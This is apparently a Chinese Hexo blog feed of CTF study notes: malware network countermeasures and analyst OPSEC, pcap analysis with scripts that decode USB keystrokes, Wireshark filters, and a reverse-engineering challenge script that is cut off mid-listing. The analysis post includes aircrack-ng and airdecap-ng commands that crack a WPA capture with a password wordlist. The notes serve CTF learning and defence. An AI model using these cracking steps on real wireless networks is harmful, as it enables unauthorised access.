    <content type="html"><![CDATA[<p>恶意代码大量使用网络连接，我们将解释如何开发基于网络的有效应对措施。<br><a id="more"></a></p><h1 id="网络应对措施"><a href="#网络应对措施" class="headerlink" title="网络应对措施"></a>网络应对措施</h1><p>网络行为的基本属性包含IP地址、TCP、与UDP端口、域名，以及流量内容等。因此，网络和安全设备可以利用它们，来提供网络应对措施，根据IP地址和端口，防火墙和路由器可以限制对网络的访问。配置DNS服务器，可以将一个已知的恶意域名重定向到内部主机，这被称为sinkhole技术。配置代理服务器，可以检测或者阻止访问某些域名。<br>入侵检测系统(IDS)、入侵防御系统(IPS),以及电子邮寄和web代理等其他安全应用。</p><h2 id="在原生环境中观察恶意代码"><a href="#在原生环境中观察恶意代码" class="headerlink" title="在原生环境中观察恶意代码"></a>在原生环境中观察恶意代码</h2><p>恶意代码分析的第一步不应该是在实验环境中运行恶意代码，也不应该是解刨恶意代码分析它的反汇编代码。与之相反的是，你应该首先查看已经获得的关于恶意代码的所有数据。恶意代码分析师经常是得到一个没有任何上下文的恶意代码样本(或是可疑的可执行文件)，但是在大多数情况下，你可以获取额外的更多数据。开始恶意代码网络行为分析的最好方法是挖掘恶意代码已经生成的日志、报警以及网络包。<br>来自真实网络的信息比来自实验环境的信息，有着明显的优势。<br>1、真实环境捕获的信息将提供恶意应用程序真实 行为的最佳视图，而恶意代码可以被编程，以加入探测实验环境的能力。<br>2、活跃恶意代码的真实场景信息 能够提供独特的视角，来加快分析过程。真实流量提供了恶意代码在两个端点(客户端和服务器端)之间的通讯信息，然而，在实验环境里，分析者通常只能获取其中一端的信息。而分析恶意代码如何接受内容，比起分析恶意代码如何产生内容，往往会更具有挑战性。因此，双向的样本流量可以帮助分析师加快恶意代码解析<br>3、此外，当你被动地查看信息时，不存在 泄露给攻击者分析活动的风险。</p><h2 id="恶意代码行为的痕迹"><a href="#恶意代码行为的痕迹" class="headerlink" title="恶意代码行为的痕迹"></a>恶意代码行为的痕迹</h2><p>我们在实验环境中运行这个文件，需要时刻注意它的网络行为。<br>1、请求域名<br>2、ip地址<br>3、http的GET请求</p><h2 id="OPSEC-操作安全性"><a href="#OPSEC-操作安全性" class="headerlink" title="OPSEC=操作安全性"></a>OPSEC=操作安全性</h2><p>当调查恶意代码过程中采取某些行动时，会告诉恶意代码编写者你已经识别出了恶意代码，甚至可能会向攻击者透露你的个人信息。对于攻击者而言，有许多潜在的攻击方法，可以确定出调查活动<br>1、发送带有到某个特定链接的针对性网络钓鱼邮件(也被称为鱼叉式网络钓鱼)，观察试图从期望地理区域之外IP地址发来链接的访问。<br>2、设计一种利用方式，在博客评论中创建一个经过编码的链接，从而有效地创建一个私人的但可以公开访问的感染审计记录。<br>3、在恶意代码中嵌入一个未使用域名，观察对这个域名的解析。<br>4、如果攻击者意识到自己正在被调查，他们可能会改变策略，从而消失得无影无踪。</p><h1 id="安全地调查在线攻击者"><a href="#安全地调查在线攻击者" class="headerlink" title="安全地调查在线攻击者"></a>安全地调查在线攻击者</h1><p>最安全的选择是完全不使用互联网去调查攻击，但是这是不切实际的。</p><h2 id="间接性策略"><a href="#间接性策略" class="headerlink" title="间接性策略"></a>间接性策略</h2><p>一种间接策略是使用某些旨在提供匿名服务机制，如 Tor<br>另一种策略是使用专门的机器来研究，通常是虚拟机。也可以用一些方法来隐藏专用机器的具体位置，如下:<br>1、使用匿名的蜂链接<br>2、通过安全shell(SSH)或者一个虚拟机私有网络(VPN),将你的连接通过远程的基础设施来进行隧道传输。<br>3、使用运行在线云服务中的一个临时远程机器。</p><h2 id="获取IP地址和域名信息"><a href="#获取IP地址和域名信息" class="headerlink" title="获取IP地址和域名信息"></a>获取IP地址和域名信息</h2><p>DomainTools：<a href="http://www.domaintools.com" target="_blank" rel="external">http://www.domaintools.com</a><br>RobTex：<a href="http://www.robtex.com" target="_blank" rel="external">http://www.robtex.com</a><br>BFX DNS logger: <a href="http://www.bfk.de/bfk_dnslogger_en.html" target="_blank" rel="external">http://www.bfk.de/bfk_dnslogger_en.html</a></p><h2 id="基于内容的网络应对措施"><a href="#基于内容的网络应对措施" class="headerlink" title="基于内容的网络应对措施"></a>基于内容的网络应对措施</h2><p>网络基本属性，ip和地址<br>基于内容特征往往更有价值并且作用更加持久，因为它们使用更多基础特征来识别恶意代码。</p><h2 id="结合静态和动态技术分析"><a href="#结合静态和动态技术分析" class="headerlink" title="结合静态和动态技术分析"></a>结合静态和动态技术分析</h2><p>ida为主，其它为辅</p><h1 id="寻找网络操作代码"><a href="#寻找网络操作代码" class="headerlink" title="寻找网络操作代码"></a>寻找网络操作代码</h1><p>评估网络通信的第一步是找到用于执行通信的系统调用。Windows套接字(winsock)中的 部分API是最常用的底层函数。</p><h2 id="了解网络内容的来源"><a href="#了解网络内容的来源" class="headerlink" title="了解网络内容的来源"></a>了解网络内容的来源</h2><p>特征生成中最有价值的元素是恶意代码中的硬编码。<br>1、随机数据<br>2、来源于标准网络库的数据<br>3、来源于恶意代码的硬编码数据<br>4、关于主机及其配置信息的数据<br>5、从其他来源接受数据</p><h2 id="临时数据"><a href="#临时数据" class="headerlink" title="临时数据"></a>临时数据</h2><p>恶意代码运行时会生成一下临时数据，这可能会很有价值。确定编码方式。</p><h1 id="了解攻击者的意图"><a href="#了解攻击者的意图" class="headerlink" title="了解攻击者的意图"></a>了解攻击者的意图</h1><p>1、专注属与两端之间的协议元素<br>2、专注于已知的任何协议元素作为秘钥的部分<br>3、确定流量中不太明显的协议元素</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;恶意代码大量使用网络连接，我们将解释如何开发基于网络的有效应对措施。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>流量包分析</title>
    <link href="http://yoursite.com/2018/05/14/misc_8_pcapeng/"/>
    <id>http://yoursite.com/2018/05/14/misc_8_pcapeng/</id>
    <published>2018-05-14T10:49:18.000Z</published>
    <updated>2018-05-17T08:41:12.328Z</updated>
    
    <content type="html"><![CDATA[<p>流量包分析<br><a id="more"></a></p><h1 id="usb流量包"><a href="#usb流量包" class="headerlink" title="usb流量包"></a>usb流量包</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到数据包使用wireshark打开后看到Protocol 为USB协议。USB协议的数据部分在Leftover Capture Data域之中，kali下可以用tshark命令可以将 leftover capture data单独提取出来 命令如下：<br><code>tshark -r usb1.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code><br>运行命令并查看usbdata.txt 发现数据包长度为八个字节,这里查到USB流量分为键盘流量和鼠标流量</p><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet。<br>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。<br>这里数据包长度是八个字节显然为键盘数据包<br>这里有usb的的映射表<br><code>http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</code><br>usb keyboard的映射表 根据这个映射表有写脚本解码得出的数据包<br><img src="https://i.imgur.com/VnMi8mX.png" alt=""></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</div><div class="line">nums = []</div><div class="line">keys = open(<span class="string">'usbdata.txt'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</div><div class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</div><div class="line">         <span class="keyword">continue</span></div><div class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</div><div class="line">keys.close()</div><div class="line">output = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</div></pre></td></tr></table></figure><h2 id="鼠标流量数据包转换脚本"><a href="#鼠标流量数据包转换脚本" class="headerlink" title="鼠标流量数据包转换脚本"></a>鼠标流量数据包转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">nums = [] </div><div class="line">keys = open(<span class="string">'data.txt'</span>,<span class="string">'r'</span>) </div><div class="line">posx = <span class="number">0</span> </div><div class="line">posy = <span class="number">0</span> </div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </div><div class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </div><div class="line">     <span class="keyword">continue</span> </div><div class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </div><div class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </div><div class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </div><div class="line">    x -= <span class="number">256</span> </div><div class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </div><div class="line">    y -= <span class="number">256</span> </div><div class="line">posx += x </div><div class="line">posy += y </div><div class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></div><div class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </div><div class="line">    <span class="keyword">print</span> posx , posy </div><div class="line">keys.close()</div></pre></td></tr></table></figure><h2 id="笔记本键盘"><a href="#笔记本键盘" class="headerlink" title="笔记本键盘"></a>笔记本键盘</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">nums=[<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x63</span>,<span class="number">0x31</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x32</span>,<span class="number">0x78</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x6d</span>,<span class="number">0x76</span>,<span class="number">0x79</span>,<span class="number">0x67</span>,<span class="number">0x37</span>,<span class="number">0x77</span>,<span class="number">0x7a</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x75</span>,<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6a</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x70</span>]</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> nums:</div><div class="line">    s+=chr(x)</div><div class="line"><span class="keyword">print</span> s</div><div class="line"></div><div class="line">mappings = &#123; <span class="number">0x41</span>:<span class="string">"A"</span>,  <span class="number">0x42</span>:<span class="string">"B"</span>,  <span class="number">0x43</span>:<span class="string">"C"</span>, <span class="number">0x44</span>:<span class="string">"D"</span>, <span class="number">0x45</span>:<span class="string">"E"</span>, <span class="number">0x46</span>:<span class="string">"F"</span>, <span class="number">0x47</span>:<span class="string">"G"</span>,  <span class="number">0x48</span>:<span class="string">"H"</span>, <span class="number">0x49</span>:<span class="string">"I"</span>,  <span class="number">0x4a</span>:<span class="string">"J"</span>, <span class="number">0x4b</span>:<span class="string">"K"</span>, <span class="number">0x4c</span>:<span class="string">"L"</span>, <span class="number">0x4d</span>:<span class="string">"M"</span>, <span class="number">0x4e</span>:<span class="string">"N"</span>,<span class="number">0x4f</span>:<span class="string">"O"</span>,  <span class="number">0x50</span>:<span class="string">"P"</span>, <span class="number">0x51</span>:<span class="string">"Q"</span>, <span class="number">0x52</span>:<span class="string">"R"</span>, <span class="number">0x53</span>:<span class="string">"S"</span>, <span class="number">0x54</span>:<span class="string">"T"</span>, <span class="number">0x55</span>:<span class="string">"U"</span>,<span class="number">0x56</span>:<span class="string">"V"</span>, <span class="number">0x57</span>:<span class="string">"W"</span>, <span class="number">0x58</span>:<span class="string">"X"</span>, <span class="number">0x59</span>:<span class="string">"Y"</span>, <span class="number">0x5a</span>:<span class="string">"Z"</span>, <span class="number">0x60</span>:<span class="string">"0"</span>, <span class="number">0x61</span>:<span class="string">"1"</span>, <span class="number">0x62</span>:<span class="string">"2"</span>, <span class="number">0x63</span>:<span class="string">"3"</span>, <span class="number">0x64</span>:<span class="string">"4"</span>,  <span class="number">0x65</span>:<span class="string">"5"</span>, <span class="number">0x66</span>:<span class="string">"6"</span>, <span class="number">0x67</span>:<span class="string">"7"</span>, <span class="number">0x68</span>:<span class="string">"8"</span>, <span class="number">0x69</span>:<span class="string">"9"</span>, <span class="number">0x6a</span>:<span class="string">"*"</span>, <span class="number">0x6b</span>:<span class="string">"+"</span>,  <span class="number">0X6c</span>:<span class="string">"separator"</span>, <span class="number">0x6d</span>:<span class="string">"-"</span>,  <span class="number">0x6e</span>:<span class="string">"."</span>, <span class="number">0x6f</span>:<span class="string">"/"</span> &#125;</div><div class="line"></div><div class="line">output = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</div></pre></td></tr></table></figure><h1 id="Wireshark的使用姿势"><a href="#Wireshark的使用姿势" class="headerlink" title="Wireshark的使用姿势"></a>Wireshark的使用姿势</h1><h2 id="过滤报文"><a href="#过滤报文" class="headerlink" title="过滤报文"></a>过滤报文</h2><p>1.过滤IP，如源IP或者目标 x.x.x.x<br>ip.src eq x.x.x.x or ip.dst eq x.x.x.x<br>2.过滤端口<br>tcp.port eq 80 or udp.port eq 80<br>3.过滤协议<br>tcp/udp/arp/icmp/http/ftp/dns/ip……<br>4.过滤MAC<br>eth.dst ==A0:00:00:04:C5:84<br>5.包长度过滤<br>6.http模式过滤<br>http.request.method== “GET”<br>7.ftp<br>ftp-data</p><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p>1.在statistics下选择protocol hierarchy，可以查看当前数据包中包含哪些协议<br>2.将所有选项都展开，通常我们关注HTTP协议的内容，其他明文的TCP协议或UDP协议内容也有可能需要关注。<br>3.在我们关注的协议上右键点击apply as filter -&gt;selected，可以过滤出需要的协议类型。</p><h2 id="流汇聚"><a href="#流汇聚" class="headerlink" title="流汇聚"></a>流汇聚</h2><p>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。<br>1、HTML中直接包含重要信息<br>2、上传或下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传。<br>3、一句话木马，POST请求，内容包含eval，内容使用base64加密<br>4、TCP流：通常是命令行操作。</p><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><p>使用wireshark可以自动提取通过http传输的文件内容，方法如下：<br>file-&gt;exportobjects-&gt;http<br>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击saveas进行保存，或者saveall保存所有对象再进入文件夹进行分析。</p><h2 id="无线密码破解"><a href="#无线密码破解" class="headerlink" title="无线密码破解"></a>无线密码破解</h2><p>有时候我们打开一个文件，里面只有wireless LAN 协议，很有可能是WPA或WEP加密后的无线数据包。<br>使用aircrack-ng应用程序可以进行解密。<br>1、首先是命令行模式的教程，将目标加密包复制到aircrack-ng文件夹下<br>（1）用aircrack-ng检查cap包：<br>aircrack-ng.exeshipin.cap<br>（2）使用弱口令字典破解wpa加密<br>aircrack-ng.exe shipin.cap -w wordlist.txt<br>这里wordlist.txt是弱口令字典，包含了常见的路由器密码，可以网上下载到，也可以自动生成。<br>（3）用密码解密cap<br>这里用到airdecap-ng解密cap报文，使用到了刚才的essid和破解的密码<br>airdecap-ng.exe shipin.cap -e 0719 -p 88888888<br>于是在目录下生成一个shipin-dec.cap，使用wireshark打开。<br>参考: <a href="http://www.freebuf.com/column/153197.html" target="_blank" rel="external">http://www.freebuf.com/column/153197.html</a></p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>拿到流量包，先放到kali用strings,也就是几秒钟的事情<br><code>strings for1.pcapng | grep &quot;{*}&quot;</code><br>结果:<br>Pwnium{408158c115a82175de37e8b3299d1f93}</p><h2 id="查找关键字"><a href="#查找关键字" class="headerlink" title="查找关键字"></a>查找关键字</h2><p>wireshark的<a href="https://blog.csdn.net/hzhsan/article/details/43453251" target="_blank" rel="external">过滤</a>规则<br>直接查找Ctrl+f;字节流-&gt;字符串-&gt;查找</p><h2 id="查看对话"><a href="#查看对话" class="headerlink" title="查看对话"></a>查看对话</h2><p>统计-&gt;对话-&gt;tcp</p><h2 id="转储文件"><a href="#转储文件" class="headerlink" title="转储文件"></a>转储文件</h2><p>显示和保存数据[原始数据]-&gt;另存为-&gt;hex<br>验证:保存后，可以将保存的数据16进制显示，和源数据显示是否一样。<br>rar,zip等</p><p>## </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;流量包分析&lt;br&gt;
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>Re题目</title>
    <link href="http://yoursite.com/2018/05/10/re_17_ti/"/>
    <id>http://yoursite.com/2018/05/10/re_17_ti/</id>
    <published>2018-05-10T11:45:50.000Z</published>
    <updated>2018-05-15T00:35:38.267Z</updated>
    
    <content type="html"><![CDATA[<p>做了一天的Re题目<br><a id="more"></a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>链接：<a href="https://pan.baidu.com/s/1u7IHEIt4045aLwKhh_soLw" target="_blank" rel="external">https://pan.baidu.com/s/1u7IHEIt4045aLwKhh_soLw</a> 密码：2oz4</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>一看加密函数不多，感觉可以快速做出来。然后，就做了很久很久。<br>直接找到加密函数<br><img src="https://i.imgur.com/D1nTvUg.png" alt=""><br>用od找到初始化生成的数组，并且dump出来<br><img src="https://i.imgur.com/RtC9Xtr.png" alt=""></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="comment">#flag&#123;e4435341-401a-4bc4-96c1-eadf1951d904&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ini_juz</span><span class="params">(index)</span>:</span></div><div class="line">init_key=<span class="string">'''</span></div><div class="line"><span class="string">D1 FD 44 F8 A8 86 FC 60 78 9B 3C CA DC DA 33 71</span></div><div class="line"><span class="string">31 57 2F B7 D5 60 75 D1 AD E4 50 F1 B7 51 6D C1</span></div><div class="line"><span class="string">55 08 5A 92 73 4D 2B E7 71 A6 A5 09 BA B5 68 DF</span></div><div class="line"><span class="string">C0 17 CF BE 65 DC 53 4B 15 EC 82 C2 09 2B 51 86</span></div><div class="line"><span class="string">BC 3C 38 B9 7F D8 09 70 7A 21 D9 29 8B 24 7C 43</span></div><div class="line"><span class="string">BE CF C5 9B B6 E1 83 76 9F 84 64 1D 82 A3 1F FA</span></div><div class="line"><span class="string">4C A6 09 0F EB 5B 5D 91 BC 67 2B 98 E6 E1 D2 5F</span></div><div class="line"><span class="string">F6 F4 94 E7 57 53 B9 BE C0 CF 3B FB DD C7 3D B4</span></div><div class="line"><span class="string">'''</span></div><div class="line">key=init_key.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">''</span>,<span class="string">''</span>)</div><div class="line">data=bytearray.fromhex(key)</div><div class="line">data1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</div><div class="line">data1.append(hex(data[i]))</div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">-1</span>,<span class="number">-1</span>):</div><div class="line">c1.append(data1[index+i])</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line"><span class="keyword">if</span> len(c1[i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+c1[i][<span class="number">2</span>:]</div><div class="line">c1[i]=k</div><div class="line">k=c1[<span class="number">0</span>][<span class="number">2</span>:]+c1[<span class="number">1</span>][<span class="number">2</span>:]+c1[<span class="number">2</span>][<span class="number">2</span>:]+c1[<span class="number">3</span>][<span class="number">2</span>:]</div><div class="line"><span class="keyword">return</span> k</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_juz</span><span class="params">(index)</span>:</span></div><div class="line">data=<span class="string">'''</span></div><div class="line"><span class="string">D6 90 E9 FE CC E1 3D B7 16 B6 14 C2 28 FB 2C 05</span></div><div class="line"><span class="string">2B 67 9A 76 2A BE 04 C3 AA 44 13 26 49 86 06 99</span></div><div class="line"><span class="string">9C 42 50 F4 91 EF 98 7A 33 54 0B 43 ED CF AC 62</span></div><div class="line"><span class="string">E4 B3 1C A9 C9 08 E8 95 80 DF 94 FA 75 8F 3F A6</span></div><div class="line"><span class="string">47 07 A7 FC F3 73 17 BA 83 59 